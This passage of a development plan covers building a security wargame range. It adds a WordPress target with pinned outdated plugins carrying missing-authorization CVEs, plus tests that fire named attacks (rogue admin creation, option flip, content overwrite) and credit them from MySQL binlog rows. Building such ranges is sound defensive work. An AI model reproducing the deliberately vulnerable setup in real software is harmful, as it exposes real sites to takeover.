`read_changes` now exists, so extend the guard in `platform/tests/conftest.py` to also refuse it. Add a `refuse_changes` stub and nest its patch alongside the `snapshot` one:

```python
    def refuse_changes(*args, **kwargs):
        raise effect.StateUnavailable(
            "this unit test supplied no database; effect.read_changes was "
            "refused. A test that needs it must patch api.views.effect.read_changes"
        )

    with patch("api.views.effect.snapshot", refuse_snapshot), \
            patch("api.views.effect.read_changes", refuse_changes):
        yield
```

Every `test_corp_observe` test patches `api.views.effect.read_changes` with a `return_value`, so the refusal only bites a test that forgot to.

- [ ] **Step 6: Run to verify it passes**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_corp_observe.py tests/test_loot_submit.py tests/test_api_objectives.py -v`
Expected: PASS (board loot and the generic objective path untouched).

- [ ] **Step 7: Commit**

```bash
git add platform/api/effect.py platform/api/views.py platform/tests/conftest.py platform/tests/test_corp_observe.py
git commit -m "feat(corp): credit effect_observed objectives from committed binlog rows"
```

---

## PHASE B4 — live acceptance and integration

### Task B4.1: end-to-end acceptance on the live stack

**Files:**
- Create: `test/test_corp_authz.py`
- Test: itself (acceptance over HTTP against the live stack)

**Interfaces:**
- Consumes: the full `corp` pipeline (B1–B3) on the running Docker stack.
- Produces: proof that each attack commits its DB change and is credited as its objective; that detection (TP/FP/FN/TN) is measured separately and orthogonally; that benign cases give B TN > 0; and that `corp` appears in the console catalogue.

- [ ] **Step 1: Write the acceptance test**

```python
# test/test_corp_authz.py
import requests

from conftest import PLATFORM_URL, score_when_ready
from range import run


def _session():
    created = requests.post(
        f"{PLATFORM_URL}/api/sessions/", json={"scenario": "corp"}, timeout=120
    )
    assert created.status_code == 201, created.text
    return created.json()["id"]


def _fire(session_id, case):
    fired = requests.post(
        f"{PLATFORM_URL}/api/sessions/{session_id}/attacks/",
        json={"case": case}, timeout=180,
    )
    assert fired.status_code == 201, fired.text


def test_corp_is_offered_in_the_console_catalogue(stack_is_up):
    by_id = {w["id"]: w for w in requests.get(f"{PLATFORM_URL}/api/wargames/").json()}
    assert "corp" in by_id
    assert by_id["corp"]["public_url"] == "http://corp.com"
    assert by_id["corp"]["judged"] is True


def test_each_attack_is_credited_as_its_objective_from_the_targets_own_rows(stack_is_up):
    session_id = _session()
    for case in ("corp-rogue-admin", "corp-option-flip", "corp-content-write"):
        _fire(session_id, case)
    requests.post(f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=120)

    taken = {o["key"] for o in
             requests.get(f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/").json()}
    assert {"corp-rogue-admin", "corp-self-registration", "corp-content-overwrite"} <= taken


def test_benign_corp_traffic_gives_b_a_true_negative(stack_is_up):
    session_id = _session()
    _fire(session_id, "corp-content-write")
    _fire(session_id, "corp-normal-post-read")
    _fire(session_id, "corp-normal-registration")
    requests.post(f"{PLATFORM_URL}/api/sessions/{session_id}/close/", timeout=180)

    totals = score_when_ready(
        session_id, until=lambda t: t["benign_cases"] >= 1, timeout=180
    )
    assert totals["tn"] >= 1, totals


def test_the_objective_is_orthogonal_to_detection(stack_is_up):
    session_id = _session()
    _fire(session_id, "corp-rogue-admin")
    requests.post(f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=120)
    requests.post(f"{PLATFORM_URL}/api/sessions/{session_id}/close/", timeout=180)

    score = requests.get(f"{PLATFORM_URL}/api/sessions/{session_id}/score/").json()
    taken = {o["key"] for o in
             requests.get(f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/").json()}
    assert "corp-rogue-admin" in taken, (
        "the rogue-admin objective must be credited from the committed row even "
        "though the default CRS has no signature for it"
    )
    assert "objectives" in score
```

- [ ] **Step 2: Run against the live stack**

```bash
docker compose up -d --build
cd test && ../.venv/bin/python -m pytest test_corp_authz.py -v
```

Expected: PASS. If `test_each_attack_is_credited...` fails for one objective, re-check that case's live DB change (B2) and the `COLUMNS` positions (B3.4) against the captured fixture; the credit comes only from the committed row.

- [ ] **Step 3: Commit**

```bash
git add test/test_corp_authz.py
git commit -m "test(corp): live acceptance — attacks credited from rows, detection orthogonal, TN>0"
```

---

### Task B4.2: full verify, measure, and the handover

**Files:**
- Modify: `metrics.json` (via `bin/measure --save`)
- Modify: `docs/STATE.md`

- [ ] **Step 1: Full verify against the live stack**

```bash
bin/verify
```

Expected: unit + acceptance + ratchet all green. If red, or any gated metric grew: `git reset --hard` and stop; report what was learned (per the session protocol).

- [ ] **Step 2: Confirm the gated numbers held**

```bash
bin/measure
```

Expected and required:
- `core_loc` ≤ **461** (unchanged — nothing was added under `scoring/`, `ingest/`, `rules/`, `harness.py`).
- `dependencies` **6** (unchanged — no new pip package).
- `services` **7** (unchanged).
- `wargame_services` **4** (grew from 2 — reported, not gated).
- `product_loc` grown (reported, not gated).
- `tests` floor **risen** from 1196 (every new `test_*` added to it).

If `core_loc` moved, a product-space file was misplaced into core — move it back under `platform/api/` before saving.

- [ ] **Step 3: Save the baseline**

```bash
bin/measure --save
```

- [ ] **Step 4: Update `docs/STATE.md`**

Add, under "What exists now" / targets, that the range now has **two targets**: the Django board (`loot_verified`) and the WordPress `corp` site (`effect_observed`), the latter scored by reading the target's own MySQL binary log; note that **both** the session-start baseline and the binlog observe read only the `corp-db` container over the estate — nothing is instrumented on the WordPress app (the user's explicit choice); the three CVEs and pinned plugin versions; the new `wargame_services` 2 → 4; the `corp-db` binlog-ROW requirement; and the transport rule (harness sends only `params`/`json`, no form body). Record any alternate CVE swapped in during B2. Replace the backlog line "Left: sub-project B, the PHP company site (target #2), its own spec." with a done entry. Keep `metrics.json` figures out of prose (they go stale).

- [ ] **Step 5: Commit**

```bash
git add metrics.json docs/STATE.md
git commit -m "chore(corp): ratchet baseline and STATE handover for the WordPress authz target"
```

**Commit, never push** (session protocol). Pushing and merging are the human's.

---

## Self-Review

**1. Spec coverage** (against `docs/superpowers/specs/2026-10-04-wordpress-authz-objective-design.md`):

- Second WordPress target, three outdated plugins, each a missing-authorization CVE → B1.2, B2.1–B2.3. ✓
- Real WordPress on MySQL, official image, SVN-tagged pinned plugins, auto-approve registration → B1.2. ✓
- MySQL binlog ROW → B1.1. ✓
- WAF vhost for `corp.com`; `/internal/` 404 kept only as defense-in-depth → B1.3. Baseline state is read from the `corp-db` container, not a WP endpoint. ✓
- `wargame_services` grows, `services` does not → B1.1 Step 7, B4.2. ✓
- The three objectives (table, CVEs, DB tables, difficulty 5/4/3) → B2.1–B2.3, B3.2. ✓
- `effect_observed` model: snapshot at start (read from `corp-db`), observe via binlog (read from `corp-db`), attribute+credit through existing scoreboard path → B3.3, B3.4, B3.5. Both reads hit only the DB container — nothing on WordPress. ✓
- "Read the change log rather than diff two snapshots" (catch made-and-undone changes, exact timestamp) → `parse_binlog` timestamps every row from `SET TIMESTAMP`; B3.4/B3.5. ✓
- Attack cases: single unauthenticated request, console-fireable, `expect` of own mechanism, benign cases for TN → B2.1–B2.3. ✓
- Open item "confirm live per CVE" → B2 is entirely live-confirmation first. ✓
- Open item "mysqlbinlog read cadence" → B3.5 reads over the whole session window on demand (per observe call); dependency-free. ✓
- Open item "internal/estate-only read path for the session-start snapshot" → **intentionally superseded by the user's explicit choice** (coordinator direction): read the DB, plant nothing on WordPress. The snapshot and the binlog observe both read only the `corp-db` container over the estate (B3.3 `effect.snapshot`, B3.5 `effect.read_changes`); no WP instrumentation. The spec's "mirror the board's WAF-404 HTTP read" is not implemented; the `corp.com` `/internal/` 404 remains only as harmless defense-in-depth. ✓
- Constraints (core_loc flat, deps 6, services flat, tests floor up, target decides, REST request, no comments) → Global Constraints + B4.2. ✓
- Relationship to board (both coexist, console picks) → `corp` is a second `WARGAMES` entry; board untouched; B3.1/B4.1. ✓

**2. Placeholder scan:** no "TBD"/"handle edge cases"/"similar to Task N"; every code step carries runnable code. The deliberate live-confirmation placeholders (exact request shape, exact UM auto-approve option key, exact `@N` positions) are flagged as **must-confirm-live** steps with the command that produces the real value and the alternate to swap to — that is the nature of a reproduction-first phase, not a hidden gap.

**3. Type/name consistency:** `effect.StateUnavailable`, `effect.snapshot(runner)`, `effect.Change(table, kind, at, columns)`, `effect.parse_binlog(text, since)`, `effect.COLUMNS`, `effect.read_changes(runner, since)`, `effect.credited(spec, baseline, changes)` are defined once and used consistently across B3.3–B3.5 and the tests. Both `snapshot` and `read_changes` take a substrate `runner` and exec into `corp-db`; the view builds it with `substrate().runner("corp-db")` in both the session-start gate (B3.3 Step 4) and `_observe_objectives` (B3.5). `effect.py` imports no Django. `api.views._observe_objectives`/`_effect_window` names match their call sites. `Session.baseline` shape `{"admins","options","posts"}` is consistent between `snapshot` (B3.3) and `credited` (B3.5). Wargame id `corp`, host `corp.com`, containers `fsl-corp-wp`/`fsl-corp-db`, roles `corp`/`corp-db`, case file `corp.yaml`, tier keys `corp-rogue-admin`/`corp-self-registration`/`corp-content-overwrite` and effect discriminators `rogue_admin`/`option_flip`/`content_write` are used identically throughout.
